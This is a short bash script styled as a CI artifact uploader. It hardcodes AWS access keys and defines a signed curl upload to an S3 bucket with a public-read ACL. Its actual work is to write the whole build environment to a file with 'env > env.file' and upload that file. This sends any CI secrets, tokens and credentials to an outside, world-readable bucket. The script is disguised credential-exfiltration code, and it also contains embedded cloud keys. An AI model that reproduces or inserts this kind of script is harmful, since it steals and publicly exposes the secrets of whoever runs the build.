#!/usr/bin/env bash

DFB_AGENTS_URL=https://s3.amazonaws.com/external-ci-artifacts/agents
DFB_BUILD_ID=7777
DFB_PROJECT_DIR=$(pwd)
DFB_CURRENT_PROJECT=$(basename $PWD)
DFB_PACKAGING_URL=s3://external-ci-artifacts/artifacts/travis/
AWS_ACCESS_KEY_ID=AKIAIIU2LBOCCKXAIFZQ
AWS_SECRET_ACCESS_KEY=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

function putS3
{
  path=$1
  file=$2
  aws_path=$3
  bucket='external-ci-artifacts'
  date=$(date +"%a, %d %b %Y %T %z")
  acl="x-amz-acl:public-read"
  content_type='application/json'
  string="PUT\n\n$content_type\n$date\n$acl\n/$bucket$aws_path$file"
  signature=$(echo -en "${string}" | openssl sha1 -hmac "${AWS_SECRET_ACCESS_KEY}" -binary | base64)
  curl -X PUT -T "$path/$file" \
    -H "Host: $bucket.s3.amazonaws.com" \
    -H "Date: $date" \
    -H "Content-Type: $content_type" \
    -H "$acl" \
    -H "Authorization: AWS ${AWS_ACCESS_KEY_ID}:$signature" \
    "https://$bucket.s3.amazonaws.com$aws_path$file"
}


env > env.file
putS3 "$(pwd)" "env.file" $1
